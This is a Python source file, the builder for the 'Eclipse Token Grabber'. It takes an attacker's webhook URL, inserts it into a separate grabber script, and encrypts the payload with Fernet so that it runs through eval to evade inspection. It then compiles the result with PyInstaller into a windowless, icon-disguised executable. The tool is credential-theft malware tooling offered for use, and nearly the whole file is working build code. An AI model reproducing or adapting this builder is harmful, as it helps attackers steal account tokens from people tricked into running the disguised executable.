import os

from os import remove as delete_file, path
from tokenize import Name
from turtle import clear
from cryptography.fernet import Fernet
from sys import platform as OS
from argparse import ArgumentParser, Namespace
from subprocess import run, PIPE
from colorama import Fore, Style
from cgi import print_directory


ly = Fore.LIGHTYELLOW_EX
oa = Fore.LIGHTMAGENTA_EX
ob = Fore.LIGHTBLUE_EX
re = Fore.RESET
gr = Fore.LIGHTGREEN_EX

good = f"{Fore.GREEN}[+]{Style.RESET_ALL}"
bad = f"{Fore.RED}[-]{Style.RESET_ALL}"

start_banner = F'''{ly}
                                                     ___
                                                  ,o88888
                                               ,o8888888'
                         ,:o:o:oooo.        ,8O88Pd8888"
                     ,.::.::o:ooooOoOoO. ,oO8O8Pd888'"
                   ,.:.::o:ooOoOoOO8O8OOo.8OOPd8O8O"
                  , ..:.::o:ooOoOOOO8OOOOo.FdO8O8"
                 , ..:.::o:ooOoOO8O888O8O,COCOO"
                , . ..:.::o:ooOoOOOO8OOOOCOCO"
                 . ..:.::o:ooOoOoOO8O8OCCCC"o
                    . ..:.::o:ooooOoCoCCC"o:o
                    . ..:.::o:o:,cooooCo"oo:o:
                 `   . . ..:.:cocoooo"'o:o:::'                     {re}Authors{ly}:{re} Dimitris Kalopisis {ly}|{re} Yuliy Mitryashkin{ly} |{re} George Prepakis{ly}
                 .`   . ..::ccccoc"'o:o:o:::'                      {re}Twitter{ly}:{re} {oa}@{re}Dkalopisis        {ly}|{re} {oa}@{re}JM1k1{ly}            |{re} {oa}@{re}kerag0{ly}
                :.:.    ,c:cccc"':.:.:.:.:.'
              ..:.:"'`::::c:"'..:.:.:.:.:.'
            ...:.'.:.::::"'    . . . . .'
           .. . ....:."' `   .  . . ''
         . . . ...."'
         .. . ."'     
        .

{oa}------------------------------------------------------------------{re}

'''

grabber_path = path.join("code", "eclipse-grabber.py")
fernet_key = Fernet.generate_key().decode()

cur_dir = os.getcwd()

def clear_screen():
    
    if OS == "win32":
        os.system("cls")
    if OS == "linux" or OS == "linux2":
        os.system("clear")

def build(webhook: str, out_file: str, debug: bool):
    
    of = f"{out_file}.py"
    ot = f"{out_file}.exe"
    code_file = open(grabber_path, 'r')
    code = code_file.read()
    code_file.close()
    index = code.find("WEBHOOK")
    libs = code[0:index] + "\nfrom cryptography.fernet import Fernet\n"
    content = code[index:-1].replace("{WEBHOOK}", str(webhook))
    encrypted_content = Fernet(fernet_key).encrypt(content.encode())
    eval_code = f"\ncode = Fernet('{fernet_key}').decrypt({encrypted_content}).decode();eval(compile(code, '<string>', 'exec'))"

    build_file = open(of, 'w')
    build_file.write(libs)
    build_file.write(eval_code)
    build_file.close()

    if OS == "linux" or OS == "linux2":  # Linux
        compile_command = ["wine", "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/" + "Python/Python38-32/Scripts/pyinstaller.exe"]
    elif OS == "win32":  # Windows
        compile_command = ["pyinstaller"]
    elif OS == "darwin":  # OSX
        compile_command = ["pyinstaller"]
    else:
        exit(f"\n{bad} OS not supported\n")

    compile_command += [of, "--onefile", "--noconsole", "--hidden-import=_cffi_backend", f"--icon={path.join('img','exe_file.ico')}"]
    
    if debug:
        compile_command.pop(3)
        
    try:
        command_result = run(args=compile_command, stdout=PIPE, stderr=PIPE)
        result = str(command_result.stderr).replace("b\"", "").replace(r'\n', '\n').replace(r'\r', '\r')
        
        if "completed successfully" not in result:
            raise Exception(result)  # result.splitlines()[-2]
    except Exception as error:
        exit(f"\n{bad} Build Error: {error}\n")
    try:
        delete_file(out_file+".py")
        delete_file(out_file+".spec")
        
        if OS == "linux" or OS == "linux2":  # Linux
            print(f"[🪐] File is at ./dist!")
            os.system("rm -rf ./build")
            print(f"[💥] Removed build folder!")
            print("[✨] Opening the folder...")
            os.chdir("./dist")
            os.system(f'explorer .')
            
        elif OS == "win32":  # Windows
            print(f"[🪐] File is at ./dist!")
            os.system(f'rd /s /q build')
            print(f"[💥] Removed build folder!")
            print("[✨] Opening the folder...")
            os.chdir("./dist")
            os.system(f'explorer .')
            
        elif OS == "darwin":  # OSX
            print(f"[🪐] File is at ./dist!")
            os.system("rm -rf ./build")
            print(f"[💥] Removed build folder!")
            print("[✨] Opening the folder...")
            os.chdir("./dist")
            os.system(f'explorer .')
        
    except (FileNotFoundError, PermissionError):
        pass

def get_args() -> Namespace:
    
    parser = ArgumentParser(description='Eclipse Token Grabber Builder')
    parser.add_argument('-w', '--webhook', help='add your webhook url', default='', required=True)
    parser.add_argument('-o', '--filename', help='name your executable', default='', required=True)
    parser.add_argument('-d', '--debug', help='enable debug mode', default='', required=False, action='store_true')
    clear_screen()
    print(start_banner)
    return parser.parse_args()

def main(args: Namespace):
    
    clear_screen()
    print(start_banner)
    print(f"[🔒] Encryption Key: {fernet_key}")
    print(f"[🏗️] Building the Token Grabber, please wait. . .")
    build(args.webhook, args.filename, args.debug)
    print(f"[🧳] Successfully Built the Logger!\n")


if __name__ == "__main__":
    main(get_args())
